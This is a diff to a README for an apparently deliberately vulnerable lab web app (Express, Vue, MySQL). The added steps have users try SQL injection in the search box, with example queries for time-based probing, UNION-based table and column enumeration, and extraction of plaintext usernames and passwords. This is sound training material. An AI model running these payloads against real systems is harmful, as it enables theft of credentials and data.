@@ -27,18 +27,39 @@ $ cd server
 $ echo 'MYSQL_CREDS="mysql_password"' > .env
 ```
 
-10. The following will start up the actual webapp.
+10. To start the Express Server.
 ```bash
 $ cd client && yarn install     # Installs client dependencies
 $ cd ../server && yarn install  # Installs server dependencies
 $ yarn dev                      # Starts Express server
 ```
-11. In a new terminal, run:
+11. To start the Vue server: In a new terminal, run:
 ```bash
 $ cd client
 $ yarn serve                    # Starts Vue.js server
 ```
+12. This should open your default browser and connect to your local Vue server, if this doesn't happen go to your browser and manually connect to localhost:8080. 
+13. Try search for a computer part, such as "cpu" or "board".
+14. Try some SQLi inputs in the search box:
+```
+-- Sleeps for 2 seconds per item found
+SELECT * FROM products WHERE name LIKE '%steel%' AND 0 = SLEEP(2); -- 
 
+-- Selects everything
+SELECT * FROM products WHERE name LIKE '%'; -- 
+
+-- Append 1, 2, 3 on the bottom
+SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT 1, 2, 3 FROM dual);  -- 
+
+-- Get a list of tables
+SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);  -- 
+
+-- Get all columns from "users" table
+SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users');  -- 
+
+-- Grab usernames and passwords (stored in plain text)
+SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT id, username, password FROM users);  -- 
+```
 If you get errors connecting to MySQL, run the following:
 `$ mysql -u root -p`
 ```SQL
